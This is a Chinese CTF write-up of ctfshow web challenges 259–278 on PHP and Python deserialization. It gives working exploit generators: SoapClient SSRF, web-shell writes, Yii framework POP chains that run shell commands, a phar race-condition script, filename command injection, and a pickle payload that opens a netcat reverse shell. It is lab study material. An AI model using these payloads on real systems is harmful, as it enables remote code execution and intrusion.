## web259(CRLF,SSRF,SoapClient内置类)

```php
//flag.php
<?php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
//index.php
<?php

highlight_file(__FILE__);
$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

> 首先得利用ssrf访问flag.php
>
> 查看flag.php,需要将X-Forwarded-For构造为127.0.0.1
>
> 然后post传参token=ctfshow

> ssrf在哪呢？
>
> PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端
>
> 该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。

payload：

```
\r\n是http头之间的，\r\n\r\n是http与post数据包之间的
```

```php
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$b = new SoapClient(null, array('location' => $target, 'user_agent' => 'ctfshow^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded' . '^^Content-Length: ' . (string)strlen($post_string) . '^^^^' . $post_string, 'uri' => "ssrf"));
$a = serialize($b);
$a = str_replace('^^', "\r\n", $a);
echo urlencode($a);
```

参考文章：

[CRLF Injection](https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html)

[浅谈php原生类的利用 ](http://t.csdnimg.cn/JiWrw)

## web260(字符串序列化)

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}
```

只要有这串字符串就行了，直接传

```
ctfshow=ctfshow_i_love_36D
//序列化结果:s:18:"ctfshow_i_love_36D";
```

## web261(弱比较，__unserialize的利用)

```php
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']); 
```

知识点：

```
__serialize和__unserialize魔术方法

注意:
这两个魔术方法需要php7.4以上才能生效
当__serialize和__sleep方法同时存在，序列化时忽略__sleep方法而执行__serialize；当__unserialize方法和__wakeup方法同时存在，反序列化时忽略__wakeup方法而执行__unserialize
__unserialize的参数：当__serialize方法存在时，参数为__serialize的返回数组；当__serialize方法不存在时，参数为实例对象的所有属性值组合而成的数组
```

> ```
> code==877.php.<?php eval($_POST[1]);?>
> 因为==为弱比较，所以877.php==877
> ```

payload：

```php
<?php
class ctfshowvip
{
    public $username;
    public $password;
    public $code;
    public function __construct()
    {
        $this->username = '877.php';
        $this->password = '<?php eval($_POST[1]);';
    }
}
$a = new ctfshowvip();
echo serialize($a);
```

## web262(反序列化字符串逃逸)

```php
<?php
error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}
```



> 非预期
>
> 在message.php设置cookie，直接传入

```php
<?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token='admin';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
$a = new message(1,1,1);
echo base64_encode(serialize($a));
```

> 预期解
>
> 反序列化字符串逃逸
>
> 把base64编码后的结果放到cookie里面访问message.php就能拿到flag。当然我们也可以直接传值
>
> ```
> f=1&m=1&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
> ```

```php
<?php
class message
{
    public $from;
    public $msg;
    public $to;
    public $token = 'user';
    public function __construct($f, $m, $t)
    {
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
$f = 1;
$m = 1;
$t = 'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}';
$msg = new message($f, $m, $t);
$umsg = str_replace('fuck', 'loveU', serialize($msg));
echo $umsg;
var_dump(unserialize($umsg));
echo "\n";
echo base64_encode($umsg);
```

## web263(session反序列化)

```php
// index.php 关键代码

if(isset($_SESSION['limit'])){
		$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
	}else{
		 setcookie("limit",base64_encode('1'));
		 $_SESSION['limit']= 1;
	}
```

这里limit写错了，会一直执行后面的语句

```
$_SESSION['limit']=base64_decode($_COOKIE['limit'])
```

```php
//check.php 关键代码
ini_set('session.serialize_handler', 'php');
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
}
```

这里的配置项，session.serialize_handler有三种处理器

| 处理器                    | 对应的存储格式                                       |
| ------------------------- | ---------------------------------------------------- |
| php(默认)                 | 键名+\|+经serialize()序列化的值                      |
| php_serialize(php>=5.5.4) | 经serialize()序列化的数组                            |
| php_binary                | 键名长度对应的ASCLL字符+键名+经serialize()序列化的值 |

> 注意：在 php 5.5.4 以前默认选择的是 php，5.5.4 之后就是 php_serialize，这里的 php 版本为 7.3.11，那么默认就是 php_serialize。

该题目环境为php7.3.11，所以php.ini里的配置项就是php_serialize,在index.php中的配置项就是php_serialize

而inc.php中是php，我们需要用|来分隔开序列化值

payload：

```php
<?php
class User
{
    public $username;
    public $password;
    public $status;

    function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
    }
}
$user = new User('1.php','<?php eval($_POST["1"]);?>');
echo base64_encode('|'.serialize($user));
```

首先写入cookie，访问index.php，接着访问check.php生成木马文件，最后访问log-1.php

## web264(字符串逃逸，262plus)

这个题目吧cookie换成session，我们不能传cookie了

我们还可以直接传值

```
f=1&m=1&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

## web265(地址传参)

```php
<?php
error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}
```

按地址传参

```php
$a='123';
$b=&$a;
$b=1;
echo $a;
```

这里a的值会随着b的值进行改变

payload

```php
<?php
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = &$this->token;
    }
    public function login(){
        return $this->token===$this->password;
    }
}
$a = new ctfshowAdmin('123','1234');
echo serialize($a);
```

## web266(绕过异常)

```php
<?php
highlight_file(__FILE__);

include('flag.php');
$cs = file_get_contents('php://input');

class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```

payload:

```php
<?php
class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
}
$a = new ctfshow();
echo serialize($a);
```

这时候我们需要快速触发__destruct

姿势一：

修改序列化属性个数，2->3，类似__wakeup的绕过

姿势二：

去掉生成的序列化字符串最后的一个大括号

> 这题还可以直接不写任何东西（有类名就行，不需要里面的内容）
>
> ```
> O:7:"ctfshow":2:{}
> ```

## web267(yii框架)

![image-20240119121449709](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240119121449709.png)

在网上找到yii框架的poc

```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
           // $this->checkAccess = 'passthru';
           // $this->id = 'tac /flag';
           // $this->checkAccess = 'shell_exec';
           // $this->id = 'curl `pwd|base64`.43zptel7.requestrepo.com'; //获取路径
            $this->checkAccess = 'shell_exec';
            $this->id = "echo '<?php eval(\$_POST[1]);?>' > /var/www/html/basic/web/1.php"; //写入文件
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```

这里，passthru，shell_exec可以用的

## web268(yii框架)

poc

```php
<?php

namespace yii\rest {
    class CreateAction
    {
        public $checkAccess;
        public $id;

        public function __construct()
        {
            $this->checkAccess = 'passthru';
            $this->id = 'tac /flags';
        }
    }
}

namespace Faker {

    use yii\rest\CreateAction;

    class Generator
    {
        protected $formatters;

        public function __construct()
        {
            // 这里需要改为isRunning
            $this->formatters['isRunning'] = [new CreateAction(), 'run'];
        }
    }
}

// poc2
namespace Codeception\Extension {

    use Faker\Generator;

    class RunProcess
    {
        private $processes;

        public function __construct()
        {
            $this->processes = [new Generator()];
        }
    }
}

namespace {
    // 生成poc
    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
}
```

## web269(yii框架)

poc

```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'passthru';
            $this->id = 'tac /flagsa';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['render'] = [new CreateAction(), 'run'];
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{

    use Faker\Generator;

    class See{
        protected $description;
        public function __construct()
        {
            $this->description = new Generator();
        }
    }
}
namespace{
    use phpDocumentor\Reflection\DocBlock\Tags\See;
    class Swift_KeyCache_DiskKeyCache{
        private $keys = [];
        private $path;
        public function __construct()
        {
            $this->path = new See;
            $this->keys = array(
                "axin"=>array("is"=>"handsome")
            );
        }
    }
    // 生成poc
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
}
```

## web270(yii框架)

```php
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('passthru', 'tac /flagsaa');
    echo(base64_encode(serialize($exp)));
}
```

## web275

```php
<?php
highlight_file(__FILE__);
class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}
```

直接rce或者竞争

```
fn=php;tac f*
```

## web276(phar反序列化)

```php
<?php
highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;
    public $admin = false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile && $this->admin){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}
```

这题增加了admin参数，并且不能控，我们需要进行反序列化了

> 题目中有写文件的函数，所以可以通过file_put_contents写phar文件，然后再通过file_put_contents触发phar反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。

payload：

生成phar文件

```php
<?php

class filter{
    public $filename = "1|tac f*";
    public $filecontent;
    public $evilfile = true;
    public $admin = true;
}

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$o = new filter();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

条件竞争

```python
import requests
import time
import threading

url = 'http://02477138-eafb-4540-9e0d-858099b59b8c.challenge.ctf.show/'

f = open(r'D:\php _project\php_ser\phar.phar','rb')
data = f.read()
flag = False


def writePhar():
    response = requests.post(url+'?fn=phar.phar',data=data)


def readPhar():
    global flag
    response = requests.post(url+'?fn=phar://phar.phar',data='')
    if 'ctfshow' in response.text and flag is False:
        print(response.text)
        flag = True


while flag is False:
    a = threading.Thread(target=writePhar)
    b = threading.Thread(target=readPhar)
    a.start()
    b.start()
```

## web278(python反序列化)

```
/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m)
```

> pickle模块的应用很简单，只有四个方法：
>
>     dumps()：将 Python 中的对象序列化成二进制对象，并返回
>     loads()：读取给定的二进制对象数据，并将其转换为 Python 对象
>     dump()：将 Python 中的对象序列化成二进制对象，并写入文件
>     load()：读取指定的序列化数据文件，并返回对象

payload

```python
import pickle
import base64


class A():
	def __reduce__(self):
		return(eval,("__import__('os').popen('nc ip 9001 -e /bin/sh').read()",))

a = A()
test = pickle.dumps(a)
print(base64.b64encode(test))
```

